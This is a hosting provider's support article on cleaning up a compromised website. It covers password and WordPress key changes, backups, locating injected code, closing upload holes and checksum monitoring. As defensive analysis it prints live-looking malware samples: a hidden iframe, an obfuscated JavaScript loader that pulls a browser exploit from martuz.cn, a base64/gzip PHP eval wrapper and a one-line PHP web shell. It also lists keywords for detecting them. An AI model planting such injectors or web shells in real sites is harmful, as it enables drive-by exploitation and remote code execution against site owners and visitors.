---
permalink: recovering-from-and-dealing-with-a-site-compromise/
audit_date:
title: Recover from, and deal with, a site compromise
type: article
created_date: '2011-03-16'
created_by: Rackspace Support
last_modified_date: '2016-01-21'
last_modified_by: Rose Contreras
product: Cloud Sites
product_url: cloud-sites
---

Your site has been compromised and the initial priority is to restore to
the original state. Do not be so hasty that you remove all evidence that
can be used to track down the source of the compromise. Please follow
the following suggestions for responding to a site compromise
incident.

### Secure your workstation

Most site compromises result from the harvesting of valid login
credentials (FTP/SFTP, or web site CMS logins) from the workstation used
to update the afflicted site. There are many vectors an attacker can use
to gather these logins and passwords from your workstation. These
include: viruses, trojans, malware, spyware, email exploits, and worms.
In order for your site to stay secure you MUST maintain a secure
workstation.

Tips for maintaining a secure workstation:

-   Keep your operating system patches up to date (windows update,
    software update on mac)
-   Keep your web browser of choice up to date
-   Use a virus scanner, perform regular scans, keep the virus
    definitions up to date
-   Use a malware/spyware scanner in conjunction with your virus scanner
-   DO NOT install browser plugins from untrusted parties
-   DO NOT install software downloaded from the internet from untrusted
    parties
-   Use SFTP instead of FTP to perform site updates
-   Do not respond to, or click on links in emails that request changes
    to login credentials for any party

If your workstation is not secured, even if the site compromise is
resolved, it is likely the malicious party will harvest your new
passwords and compromise your site again.

### Change all passwords

Assume all passwords have been compromised related to the hack. If any
of your scripts contained passwords for databases and such, assume those
have been compromised. Use strong passwords when choosing a new
password.

-   Do not use dictionary words.
-   Use at least 1 number
-   Use at least 1 non-alphanumeric character
-   Use mixed case
-   The password should be at least 7 characters long
-   Do not use 1337 sp34k .

Bad Examples: passw0rd, username1, sunshine, guessme

Good Examples: p#sS8oR=, m3161Tx, The[s]HOWMUstGoOn

If you didn't before, start changing your password regularly. A
constantly changing password is much harder to brute force.

#### Key change

This information brought to you by
Wordpress.org.[[1]](http://codex.wordpress.org/Editing_wp-config.php#Security_Keys "http://codex.wordpress.org/Editing_wp-config.php#Security_Keys")

If you are running a Wordpress site, and have been recently compromised,
you will want to change your keys.

Beginning with Version 2.6, three (3) security keys, AUTH_KEY,
SECURE_AUTH_KEY, and LOGGED_IN_KEY, were added to insure better
encryption of information stored in the user's cookies. Beginning with
Version 2.7 a fourth key, NONCE_KEY, was added to this group.

You don't have to remember the keys, just make them long and complicated
or better yet, use the the online generator. You can change these at any
point in time to invalidate all existing cookies this does mean that all
users will have to login again.

Example:

    - `define('AUTH_KEY', ':dr+%/5V4sAUG-gg%aS*v;&xGhd%{YKC^Z7KKGh j>k[.Nf$y7iGKdJ3c*[Kr5Bg');`
    - `define('SECURE_AUTH_KEY', 'TufWOuA _.t>#+hA?^|3RfGTm>@*+S=8\"\'+\"}]<m#+}V)p:QijXLq,<h\\`39m_(');`
    - `define('LOGGED_IN_KEY', 'S~AACm4h1;T^"qW3_8Zv!Ji=y|)~5i63JI |Al[(<YS<2V^$T])=8Xh2a:b:}U_E');`
    - `define('NONCE_KEY', 'k1+EOc-&w?hG8j84>6L9v"6C89NH?ui{*3\\(t09mumL/fFP_!K$JCEkLuy ={x{0');`

A secret key is a hashing salt which makes your site harder to hack and
access harder to crack by adding random elements to the password.

In simple terms, a secret key is a password with elements that make it
harder to generate enough options to break through your security
barriers. A password like "password" or "test" is simple and easily
broken. A random, unpredictable password such as
"88a7da62429ba6ad3cb3c76a09641fc" takes years to come up with the right
combination.

### Back up the compromised data

Before you modify any of the compromised data you should create a backup
to preserve as much information as possible.

#### FTP and SFTP

One backup approach is to access your content via FTP and download the
compromised files. While this would preserve your data it may not
preserve any custom-set file permissions.

You can use SFTP to access your site's data in a similar fashion to FTP,
but the connection is more secure.  You can use a client like
[Filezilla](http://filezilla-project.org/) or
[WinSCP](http://winscp.net/) to back your files up via SFTP if you set
their connection type to "SFTP".  In a Linux or Mac environment an SFTP
download will normally preserve any custom file permissions on your
backup.

You can view more information about FTP and SFTP clients in [this article](/how-to/getting-started-with-cloud-sites-ftpsshfsftp-clients).

#### File Permissions on Windows

SFTP won't preserve permissions when downloading to a Windows machine,
but some SFTP clients like Filezilla and WinSCP do offer the ability to
edit file permissions remotely. That would allow you to set the
permissions manually when you restore the backed-up files.

If you only have access to a Windows machine but really need to preserve
permissions you might set up a virtual environment running Linux (using
a program like VMWare) and use SFTP from within that environment to make
your backup.

#### Cleaning up

Once the current state is backed up, you have two options:

-   Remove everything and restore from the last known good copy of the
    site
-   Leave the site as is and try to simply clean the malicious code.

Either way, save the back up so you can use it for investigation.
Imagine that your site is a crime scene. If you disturb the crime scene
with even the smallest change, you may lose a crucial piece of evidence
that could have been used to identify the criminal.

### Identify what has been compromised

There are many ways to identify a compromised site. The easiest to detect is
blatant defacement of the site, such as a message that reads *U R
H4x0ReD!* that has replaced all content of the index page.
Unfortunately, this type of compromise has fallen out of favor. Recently
compromised sites try to remain undetected so that the resources can be
used as long as possible. Back-doors are dropped in and hidden links are
inserted to generate website traffic and often even profit via AdSense
or to improve Google search rankings.

Sometimes the first indication of such a compromise is a [Google Safe Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html)
warning that the site contains malicious content (malware) or spam.
Sometimes the site gets added to spam blockers such as [SpamHaus](http://www.spamhaus.org/) because
a mass e-mail spam campaign is utilizing your website resources or
contains a link to your website in the spam messages. In the latter case,
pages are generally added in the document root that contain spam or
redirect to spam sites to sell Viagra or similar products.

#### Example injected code

Search the source code for injected--and often hidden--links or scripts
or iframes (inline frames). Use a program that can show the differences
between the original content and the current content, such as diff(1) on
Linux. Each finding should be documented and you should try to make a
simple definition of the change. For example, if the following code was
found in your index.html page:

    <body><iframe src="http://somewebsite.cn/index.php" width=135 height=131 style="visibility: hidden"></iframe><center>

In this example, the hacker inserted a hidden iframe immediately
following the HTML body tag. This is easy to automate with a script
because the script can search for the opening body tag, and simply
insert code after it. A hacker could do it with a single line of Perl
code.

#### Locating compromised files

The example above is very straightforward and very easy to identify and
rectify. Identify it by recursively iterating all site content while
searching for three key words: body, iframe, hidden.

#### Where malicious code is usually inserted

These simple HTML code injections--iframe hijacks in this
case--generally get inserted in one of 3 places:

-   the very top of the web page
-   the very bottom of the page
-   right after the HTML body tag

Since it is easy to automate a script to insert at these points, you may
want to slightly modify your search criteria as to catch all three
common scenarios. Once you have your list of likely compromised files,
you can use this as input for a routine to repair the files.

#### Dealing with obfuscated code

In the previous example, there is one key factor involved: the iframe
was injected using plain HTML. This is common, but quickly becoming less
common because the plain HTML code can easily be removed with a search
and replace. Remember, the attackers that are compromising sites these
days want to remain undetected. If they can obfuscate the hack so that
its not clear what the code does without evaluation, then they
significantly increase the chance that you might not even notice it
while scouring over the source code.

Assume a scenario where [Google Safe Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html)
warns that the site contains links to *malicious.cn*, that are known for
hosting spyware or malware. Instinctively you search over your source
code looking for *malicious.cn*, but find nothing. Odd. You browse your
site and view the source code. Sure enough, there is it in plain HTML,
an iframe to *malicious.cn*. So why wasn't it in the source code? There
could be several explanations; here are a couple:

-   The content could be injected using a client side scripting language
    such as javascript that sources the script externally not inline.
-   The content could be generated server side using ASP or PHP and the
    URL is encoded using base64 in the source code.

Let's take one example for both server side and client side scripting
languages.

#### Client-side with Javascript

Using javascript one could obfuscate the iframe hijack code in many ways
to prevent a simple text search from finding it. The two most common
methods that we've come across are using the unescape() method to
replace characters with their hexadecimal value equivalent, and using
concatenated variables to construct full text strings. I will use a real
world example to show how both methods of obfuscation are commonly being
used (though some characters are removed to try to avoid triggering
browser security checks).

    <script language=javascript><!--

    (function(){var hiT='%';var Awi5N='var:20a:3d:22:53cr:69ptE:6e:67ine:22:2cb:3d:22Ve:72sion()+:22:2c:6a:75:3dnavi:67ator:2eu:73erAg:65nt:3bif:28(u:2eind:65:78Of:28:22C:68ro:6de:22:29:3c0):26:26:28u:2eindex:4ff(:22Wi:6e:22):3e0):26:26:28u:2eind:65xOf:28:22:4eT:206:22):3c0):26:26(docu:6d:65nt:2ec:6fo:6bie:2e:69:6e:64:65xOf(:22m:69ek:3d1:22):3c0:29:26:26(ty:70:65o:66(:7arvz:74s:29:21:3d:74ypeof:28:22A:22))):7bzr:76:7ats:3d:22A:22:3beva:6c(:22if(window:2e:22+a:2b:22:29j:3dj+:22+a+:22Major:22+b+a+:22:4di:6eor:22+b+a+:22:42:75i:6c:64:22:2bb+:22j:3b:22:29:3bd:6fcu:6dent:2ewr:69:74e:28:22:3cscri:70t:20s:72c:3d:2f:2fmart:22:2b:22:75z:2e:63n:2fvid:2f:3fid:3d:22:2bj+:22:3e:3c:5c:2fscrip:74:3e:22:29:3b:7d';var VAIP=Awi5N.replace(/:/g,hiT);var rMQQz=unescape(VAIP);eval(rMQQz)})();

    --></script>

That looks pretty much like garbage, right? Well, that alone should
raise a big red danger flag. Who codes legitimately like this? Answer:
People trying to hide information. Let's quickly dissect this script.

    var hiT = %;

This will be used later in a search and replace function. The
**unescape()** function treats **%** as the delimiter token before a
hexadecimal value. People wise to the unescape hack might start
searching for %NN. That search for **%NN** would return no results since
this is a string of **:NN**. Just one more level of obfuscation to help
keep the hack undetected.

    var Awi5N = var:20a:3d:22:53cr:69 ... :3b:7d;

Now I will mention how both variable names mean absolutely nothing. The
reason for using these pseudo random variable names is to add
obfuscation. This variable stores a string of *mixed* hexadecimal ASCII
values and plain text. This variable is the important stuff; the
malicious content that when evaluated later will insert the iframe:

    var VAIP=Awin5N.replace(/:/g,hiT);

The new variable will contain the same string assigned to **Awin5N**,
except now colon is replaced with the proper delimiter for
**unescape()**, the percent sign. Following is the resulting string stored
in **VAIP**:

    'var%20a%3d%22%53cr%69ptE%6e%67ine%22%2cb%3d%22Ve%72sion()+%22%2c%6a%3d%22%22%2c%75%3dnavi%67ator%2eu%73erAg%65nt%3bif%28(u%%2eind%65%78Of%28%22C%68ro%6de%220)%26%26%28u%2eindex%4ff(%22Wi%6e%22)%3e0)%26%28u%2eind%65xOf%28%22%4eT%206%22)%3c0)%26%26(docu%6d%65nt%2ec%6fo%6bie%2e%69%6exOf(%22m%69ek%3d1%22)%3c0%29%26%26(ty%70%65o%66(%7arvz%74s%29%21%3d%74ypeof%28%22A%22)))%7bzr%76%7ats%3d%22A%22%3beva%6c(%22if(window%2e%22+a%2b%22%29j%3dj+%22+a+%22Major%22+b+a+%22%4di%6eor%22+b+a+%22%42%75i%6c%64%22%2bb+%22j%3b%22%29%3bd%6fcu%6dent%2ewr%%69%74e%28%22%3cscri%70t%20s%72c%3d%2f%2fmart%22%2b%63n%2fvid%2f%3fid%3d%22%2bj+%22%3c%5c%2fscrip%74%3e%29%3b%7d'

Here is another new variable with a random name:

    var rMQQz=unescape(VAIP);

This variable will be used to hold the results of translating all the
**%NN** values into their ASCII character equivalent. Below is the
resulting un-encoded string stored in **rMQQz**:

    var a="ScriptEngine",b="Version()+",j="",u=navigator.userAgent;if((u.indexOf("Chrome")<0)&&(u.indexOf("Win")>0)&&(u.indexOf("NT 6")<0)&&(document.cookie.indexOf("miek=1")<0)&&(typeof(zrvzts)!=typeof("A"))){zrvzts="A";eval("if(window."+a+")j=j+"+a+"Major"+b+a+"Minor"+b+a+"Build"+b+"j;");document.write("<script src=//mart"+"uz.cn/vid/?id="+j+"><\/script>");}

So the garbage evaluates to even more obfuscated Javascript. This time,
the variable concatenation is the primary method of obfuscation.

Below I will reduce the code a few changes at a time, like doing math.
I've included several iterations so that it doesn't look like magic to
those of you not very familiar with Javascript. I have included line
numbers in hopes to increase clarity.

For iteration 1, I write it out with normal indention and white spaces:

    1: var a="ScriptEngine",b="Version()+",j="",u=navigator.userAgent;
    2: if((u.indexOf("Chrome")<0)&&(u.indexOf("Win")>0)&&(u.indexOf("NT 6")<0)&&(document.cookie.indexOf("miek=1")<0)&&(typeof(zrvzts)!=typeof("A")))
    3: {
    4: zrvzts="A";
    5: eval("if(window."+a+")j=j+"+a+"Major"+b+a+"Minor"+b+a+"Build"+b+"j;");
    6: document.write("<script src=//mart"+"uz.cn/vid/?id="+j+"><\/script>");
    7: }

For iteration 2, we interpolate the **u** variable:

    1: var a="ScriptEngine",b="Version()+",j="";
    2: if((ScriptEngine.indexOf("Chrome")<0)&&(ScriptEngine.indexOf("Win")>0)&&(ScriptEngine.indexOf("NT 6")<0)&&(document.cookie.indexOf("miek=1")<0)&&(typeof(zrvzts)!=typeof("A")))
    3: {
    4: zrvzts="A";
    5: eval("if(window."+a+")j=j+"+a+"Major"+b+a+"Minor"+b+a+"Build"+b+"j;");
    6: document.write("<script src=//mart"+"uz.cn/vid/?id="+j+"><\/script>");
    7: }

The first conditional checks my **userAgent** string. The first 3 parts
of this conditional evaluate true if a browser other than Google Chrome
is on a Windows platform that is not Vista. Just to illustrate the idea,
my userAgent string is:

    userAgent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.11) Gecko/2009060214 Firefox/3.0.11

The fourth part of the conditional checks if a cookie containing
**miek=1** exists. The reason for this cookie is not clear. The cookie
could be manually created on the attackers browsers so they can test the
links without getting exploited. The last part of the conditional checks
if variable **zrvzts** is the same object type as a string. This appears
to be a sentinel value preventing the code from being evaluated more
than once when the page loads.

Finally we get into the code block. The sentinel value is set in the
first line of this block (line 4). The next line (line 5) could be
interpolated as follows:

    eval(if(window.ScriptEngine){ j = ScriptEngineMajorVersion()+ScriptEngineMinorVersion()+ScriptEngineBuildVersion(); })

Here the script checks if the **ScriptEngine** function is defined and
returns a string. This is another browser sniffer to validate that the
target is a Windows-based browser. If it *is* Windows-based, then it
gathers the Major, Minor, and Build versions and assigns the value to
variable **j**. These will be used in the next line of code:

    document.write(<script src=//martuz.cn/vid/?id=Major+Minor+Build></script>);

Finally we have reached the portion of code that has been setting off
alarms with [Google Safe Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html).
This line inserts HTML into the web page that includes a script from a
remote URL that is specifically crafted to exploit a particular version
of the browser.

So there we have it. The 3 key items that should flag this as malicious
code are:

1.  The use of **unescape()**
2.  The use of **eval()**
3.  The large block of obfuscated code

When all three of those items exist, it's almost guaranteed that the
code is malicious. Search for this combination of coding elements. You
might even start searching for all Javascript. If your site contains a
lot of Javascript, then add **unescape** or **eval** to the search.
Visually inspect all the results that the search returns. Keep your eyes
peeled for blocks of obfuscated code. If the code is malicious, then
automate a search and replace all of the code using an inline edit
one-liner, such as the examples presented previously. **Perl**, **sed**
and **Ruby** all have one-liner execution options, to name a few tools
that could be used.

#### Server-side with PHP

The same principles apply server-side that applied to client-side
scripting languages. When trying to identify malicious content, remember
that obfuscated is probably malicious. In the following example I have
included 2 more layers of obfuscation to the previous example of
obfuscated Javascript code. The Javascript code is now being compressed
using **gzdeflate** and then the resulting output is encoded using
**base64**, which is the common MIME type used to encode binary data for
programs that expect only ASCII character data. Below is what the
compressed and base64 encoded data would roughly look like:

    <?php
    eval(gzinflate(base64_decode('ZVNNb9swDL3nV3SHITKyLKlsSwkTFwiGHXboZkOVOW2oa/0qbYfx8p2TtsgGFbj4+P5DO9b03j6u7mrMpjr442O6lBBexu/265nLGiL03nqpJFb4Nqbn66x2z+fr6j98PFpV+zOb4CXyuIc+Ac0tg0ILZ19xmEBSFdaQnmRgfCkwXJWy+4CAEQU244yhSPpRocZquuQnHbg4xtcziCSMsOYu0K4BvYIgN98IQoVPIDZNBSIPZbcQm3UEXPhrM6bYF0iKgiHjh6M2OY8gtv/zUPplEobEPuKcIpD/irK8Mj2WC61xi+MUWF47VMX5t96FJAhRwWfE7C+c8HYSoiaDVPcKco1UzBcMpGqGK8ik9YRb8kgmr7WtxoYOJBBFIPW1ASmQ37XBSIqgS3ZQW74DjVhXrifKGA62DPCTNOC4/R/V6dyHC+0OEMSU4G/YNx/EYIGxqMVLQmHKX05LlGPwrvi/WuXGgnsH07ehkbWjKcFoPrFjfC+M5xsuJZNV1QpbtMr97HuMTQboz2zePHQ0lIDYb99mIpwqZuQOZhZZ8OX75nfm8/NrY+K2PZClkSc09w8P16wvbWtUbRnxox0aeWY+Ev2OWLSbLZd3+9X4m8z+AA==')));
    ?>

Again, notice the **eval()** function being used. Malicious Javascript
and PHP commonly use **eval()** to execute the code. Searching for
**eval**, **base64**, and **unescape** are all good key words that might
turn up some malicious obfuscated code. In this particular example, to
decode the data all you need to do is replace the **eval()** with
**echo()**. The obfuscated code is being encoded, not encrypted. Encoded
data is easily recovered and does not require a key. All of the encoding
algorithms discussed thus far have an encoding and complimentary
decoding algorithm with a similar name. Below is the results from simply
replacing **eval** with **echo**:

    <script language=javascript><!--(function(){var hiT='%';var Awi5N='var:20a:3d:22:53cr:69ptE:6e:67ine:22:2cb:3d:22Ve:72sion()+:22:2c:6a:3d:22:22:2c:75:3dnavi:67ator:2eu:73erAg:65nt:3bif:28(u:2eind:65:78Of:28:22C:68ro:6de:22:29:3c0):26:26:28u:2eindex:4ff(:22Wi:6e:22):3e0):26:26:28u:2eind:65xOf:28:22:4eT:206:22):3c0):26:26(docu:6d:65nt:2ec:6fo:6bie::64:65xOf(:22m:69ek:3d1:22):3c0:29:26:26(ty:70:65o:66(:7arvz:74s:3d:74ypeof:28:22A:22))):7bzr:76:7ats:3d:22A:22:3beva:6c(:22if(window:2e:22+a:2b:22:29j:3dj+:22+a+:22Major:22+b+a+:22:4di:6eor:22+b+a+:22:42:75i:6c:64:22:2bb+:22j:3b:22d:6fcu:6dent:2ewr:69:74e:28:22:3cscri:70t:20s:72c:3d:2f:2fmart:22:2b:22:75z:2e:63n:2fvid:2f:3fid:3d:22:2bj+:22:3e:3c:5c:2fscrip:74:3e:22:29:3b:7d';var VAIP=Awi5N.replace(/:/g,hiT);var rMQQz=unescape(VAIP);eval(rMQQz)})();--></script>

That should look familiar. It is the obfuscated Javascript that we
decoded previously. As you can see, using a combination of server-side
and client-side scripting languages--as well as a healthy dose of
encoding--it is very easy to hide the source of malicious content.
However, by obfuscating the content, the attacker creates a few easily
identifiable clues. Now that we know some of those clues, (**eval**,
**unescape**, **base64_encode**, **gzinflate**, etc), we can better
track down and identify the source of the malicious content.

###  Find the vulnerability

Up until this point, all we have been doing is identifying the results
of the vulnerability. The next step is to plug the hole so that it does
not continue to be exploited. Again, the possibilities are too numerous
for us to cover them all, so instead we'll mention a few of the most
common that I have found, and give a real world example.

#### Passwords

The first thing we did was to change all passwords. If the attacker
knows the passwords, there is no stopping him from doing anything. The
password could have been compromised many ways. One possibility is that
the password was weak and easily guessed or brute forced. Setting the
password to something as trivial as password is just inviting trouble.
Choose a strong password. The password could also have been sniffed off
the network. If you use unencrypted protocols such as vanilla FTP, then
the password is sent in the clear. Anyone capable of eavesdropping on
the network traffic could extract the password. Password protected URLs
using **Apache's mod_auth\_basic (.htpasswd) offers no encryption**.
This, too, could be easily picked up using a network sniffer or the
password could brute forced. Oftentimes administrative pages are
protected using this type of access control, so it's important to know
the weaknesses that are inherit to it.

**Note:** Review every resource protected by password authentication--this includes databases--and make sure the passwords are transmitted and stored encrypted.

#### Third-party drop-ins

If you are using a third party drop-in such as one of the popular
Content Management Systems--WordPress, Joomla, Drupal, Movable Type,
TypePad, Wordsmith, DotNetNuke, PHP Nuke, etc.--keep up to date on
patches/updates. Since so many sites use these drop-ins, attackers know
that if they can find a vulnerability in one of these, then there are
thousands of sites that they can find to exploit and compromise.
WordPress is currently the most popular CMS. Professional websites that
get millions of hits a day use it. According to their site, hundreds of
thousands of sites use it; imagine how that appeals to attackers.
Hackers make extraordinary efforts to discover vulnerabilities in
WordPress because of the large footprint of users they could compromise
using that single vulnerability. Do not assume that if it's a
third-party application it is secure. If your site has been compromised,
and you use a third-party drop-in, check for and apply any available
updates immediately and consider consulting the vendor's forums to
determine if other users have been affected and whether a new patch will
be made available soon.

#### Weak input validation

Any part of your site that allows user input should be validated. This
is the most common software vulnerability. The repercussions of not
validate vary, but none of them are good. A common side effect is buffer
overflows. Buffer overflows can cause the application to crash, return
unexpected results, or worse case give the attacker control of the
instruction pointer. It is not only text input that needs to be
validated; content type must be validated as well. Now we will use a
real world scenario as an example.

There was an instance where multiple web sites were flagged by [Google Safe Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html)
for containing malware or spam. After investigation, it was discovered
that nearly every HTML page had malicious links embedded that directed
users to a site that attempted to exploit the browser. A single user
modified all of the compromised content. This was a big clue in helping
narrow down the source of the vulnerability. While searching for all
content owned by this user for binaries or scripts--this was done by
multiple searches on key words like &lt;?php or \#!/ or file extensions,
or file types using the Linux file(1) utility--one particular file stood
out among the others. There was a file with the extension of **.php** in
the images directory. The related website allowed users or site members
to upload their own image for their avatars when posting in the forums.
The PHP script contained this very trivial, yet equally effective one
liner:

    <?php
    if(isset($_POST['e'])) eval(base64_decode($_POST['e']));
    ?>

This elegant one liner allows arbitrary execution of PHP code passed to
the script via the POST HTTP header variable of **e**. Again, we find
**eval** and **base64_decode** are being used. Since the **images**
path is going to be used to display the avatars, the URL is public,
which makes this exploit available to anyone who knows the name of the
PHP script, or any member that can upload their own avatar.

The script should have validated the content type before allowing it to
be uploaded. Below is a snipit of PHP code that could be used to
validate the content and ensure that the image size is reasonable for
avatars. This could be used to patch the hole:

    if ((($_FILES["file"]["type"] == "image/gif") || ($_FILES["file"]["type"] == "image/jpeg") || ($_FILES["file"]["type"] == "image/png") || ($_FILES["file"]["type"] == "image/pjpeg") || ($_FILES["file"]["type"] == "image/x-png")) && ($_FILES["file"]["size"] < 20000))

Input validation exploits are by far the most common method to exploit a
site. The more common vulnerabilities that lack of input validation
leave open are Cross Site Scripting (XSS), SQL Injections, and Cross
Site Request Forgeries (CSRF). These vulnerabilities have existed since
the 90s and continue to get exploited due to poor coding practices.
[OWASP.org](http://www.owasp.org) provides good
information on secure coding practices.

#### Error Pages

This is simple: do not allow debug info to be presented outside of a
testing environment. Some languages default behavior is dump verbose
errors including the 10 lines of code around the line that caused the
exception, as well as the full path to the script. If an attacker can
cause your page to have an exception, then they can learn the inner
workings of the script and inside information about where things are on
your site. Disable this feature. Error pages should simply state that an
error has occurred. Make custom error pages to ensure the customer only
sees what you expect them to see. Do not allow the attacker to easily
reverse engineer your scripts by divulging the debug information.

### Shared Hosting

Last, but certainly not least, are the extra precautions to take when
using shared hosting, such as the Rackspace Cloud Sites. The environment
is shared, so you must rely heavily on file level ACLs to restrict
access. **Under no circumstance should any data be world or everyone
writable, and in most all cases, world/everyone does not even need read
access to the files.** Some situations require that directories be
readable/listable and executable by everyone/world. Use the policy of
least privileged. Only give the bare minimal access to the file required
for the site to work. If you are uncertain of what those permissions
are, contact support and they can assist you. If you had files or
directories that are everyone/world writable, then those are prime
targets for the attacker. Change them immediately to more secure
permissions. Temp data is likely being stored in the default location,
which is usually the same place for all users. Again, take special
precautions in these situations to protect sensitive data.

### Clean Up

Now that you have identified the compromised content, and plugged the
vulnerability, you can proceed with [restoring the original
content](#Cleaning_up).

See the [previous examples](#Locating_compromised_files) of how to use
in-place edit one-liners to automate searching and replacing bad
content.

#### Preventative/Counter Measures

Here is where we will discuss some tips to help improve security and
awareness.

#### Monitor File Changes

Rackspace Cloud Sites offers the ability to schedule jobs to execute.
People know this as batch jobs or--in the Linux world--as cron jobs. You
can create a job that monitors the integrity of your content for
changes. [Message Digest 5 (MD5)](http://en.wikipedia.org/wiki/MD5 "http://en.wikipedia.org/wiki/MD5")
is a hashing algorithm that takes all of the bits of a file, throws them
in a blender with some crazy hashing algorithm, and generates a
relatively unique value; this value is called the checksum of the
content. If the file content changes even by one bit--a to b--the
checksum should be different. Below we can see how the difference
between the upper case and lower case C in cloud drastically changes the
checksum:

    $ echo "The Rackspace Cloud" > myfile
    $ cat myfile
    The Rackspace Cloud
    $ md5sum myfile
    c1827b3a145491bd5593326d2bb106b8 myfile
    $ echo "The Rackspace cloud" > myfile
    $ cat myfile
    The Rackspace cloud
    $ md5sum myfile
    bdc973f53259675a354974e6618b5a51 myfile

With this information at your disposal, it is not difficult to make a
script that will check all the content of your site (or specific files
if you have lots of content) and notify you if the checksum has changed.
Schedule the script to run daily or whatever interval is reasonable for
your situation. If a checksum has changed, verify that it is a change
you have approved. If it is not a change you expected, investigate
immediately to ensure your content has not been compromised. Be aware
that your script can also become compromised, so it's a good idea to
keep it out of the website's document root.
